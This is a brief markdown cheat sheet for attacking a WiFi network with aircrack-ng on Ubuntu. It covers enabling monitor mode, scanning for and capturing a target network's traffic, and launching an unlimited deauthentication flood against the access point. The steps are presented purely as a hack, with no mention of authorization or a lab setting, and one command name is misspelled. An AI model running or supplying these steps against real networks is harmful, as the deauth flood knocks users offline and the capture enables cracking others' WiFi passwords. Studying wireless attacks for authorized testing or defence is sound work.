## Ubuntu Wifi Hack Aircrack-ng (vol. 1) 

Check for any conflicting processes and kill them
- ```sudo airmon-ng check kill```

Monitor mode: on
- ```sudo airmon-ng start wlo1```

Monitor networks
- ```sudo airodump-ng wlo1mon``` | Get the *bssid* and *channel* info

Monitor target net
- ```sudo airodumo-ng wlo1mon -d <bssid>```

attack
- ```sudo airodump-ng -w hack1 -c <channel> --bssid <bssid> wlo1mon```

deauth attack on another terminal
- ```sudo aireplay-ng --deauth 0 -a <bssid> wlo1mon```
